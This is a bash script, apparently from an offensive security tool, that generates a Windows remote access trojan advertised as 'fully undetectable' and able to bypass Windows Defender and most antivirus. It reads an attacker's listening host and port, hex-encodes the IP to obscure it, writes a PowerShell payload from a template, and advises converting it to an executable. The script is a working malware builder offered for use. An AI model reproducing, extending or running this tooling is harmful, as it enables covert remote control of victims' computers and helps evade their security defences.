#!/bin/bash
NC='\033[0m'
RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;040m'
ORANGE='\033[1;38;5;202m'
BLUE='\033[1;38;5;012m'
BLUE2='\033[1;38;5;032m'
PINK='\033[1;38;5;013m'
GRAY='\033[1;38;5;004m'
NEW='\033[1;38;5;154m'
YELLOW='\033[1;38;5;214m'
CG='\033[1;38;5;087m'
CP='\033[1;38;5;221m'
CPO='\033[1;38;5;205m'
CN='\033[1;38;5;247m'
CNC='\033[1;38;5;051m'
function banner(){
echo -e ${RED}"#############################################################################"
echo -e ${CP}"    ____        _____ _   _ ____   _____        ______      _  _______       #"
echo -e ${CP}"   / /\ \      / /_ _| \ | |  _ \ / _ \ \      / /  _ \    / \|_   _\ \      #"
echo -e ${CP}"  | |  \ \ /\ / / | ||  \| | | | | | | \ \ /\ / /| |_) |  / _ \ | |  | |     #"
echo -e ${CP}" < <    \ V  V /  | || |\  | |_| | |_| |\ V  V / |  _ <  / ___ \| |   > >    #"
echo -e ${CP}"  | |    \_/\_/  |___|_| \_|____/ \___/  \_/\_/  |_| \_\/_/   \_\_|  | |     #"
echo -e ${CP}"   \_\                                                              /_/      #"
echo -e ${RED}"        A Fully Undectable RAT that Bypass Window10 Defender Protection      #"
echo -e ${RED}"                 And Almost Any Antivirus Protections                        #"
echo -e ${BLUE}"                https://facebook.com/unknownclay                             #"
echo -e ${PINK}"                    Coded By: Machine404                                     #"
echo -e ${CNC}"                 https://github.com/machine1337                              #"
echo -e ${RED}"#############################################################################"

}
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e  ${RED} "[ X ] You must be root to run the script\n"; echo ; exit 1; }
clear
sleep 1
echo -e ${CP}"[+] Checking Internet Connectivity\n"
if [[ "$(ping -c 1 google.com | grep '100% packet loss' )" != "" ]]; then
  echo "[ X ] No Internet Connection\n"
  exit 1
  else
  echo "[+] Internet is present"
  
fi
sleep 1
function unsecure(){
clear
banner
echo -e -n ${BLUE}"\n[+] Enter LHOST: "
read  lhost
echo -e -n ${BLUE}"\n[+] Enter LPORT: "
read port
mkdir -p output
Hexip=$(printf '%02X' ${lhost//./ } | sed  -e 's/^/0x/')
sleep 2
echo -e -n ${PINK}"\n[+] Generating Your Undectable Payload :)\n"
sleep 1
cd payloads
cat payload.ps1 | sed "s/{lhost}/$Hexip/gi" | sed "s/{lport}/$port/gi" >> bypass.ps1
cd ..
mv /opt/window-rat/payloads/bypass.ps1 /opt/window-rat/output/

sleep 2
echo -e -n ${YELLOW}"\n[+] Payload saved as /output/bypass.ps1 \n "
sleep 1
echo -e -n ${RED}"\n[+] Tip: Now Convert bypass.ps1 to exe format using ps2exe tool"
}

menu()
{
clear
banner
echo -e ${YELLOW}"\n[*] Create Fully Undectable RAT For Windows\n "
echo -e "  ${NC}[${CG}"1"${NC}]${CNC} choose payload"
echo -e "  ${NC}[${CG}"2"${NC}]${CNC} Exit"

echo -n -e ${YELLOW}"\n[+] Select: "
        read choose
                if [ $choose -eq 1 ]; then
                        unsecure
                elif [ $choose -eq 2 ]; then
                      exit
                fi
}
menu
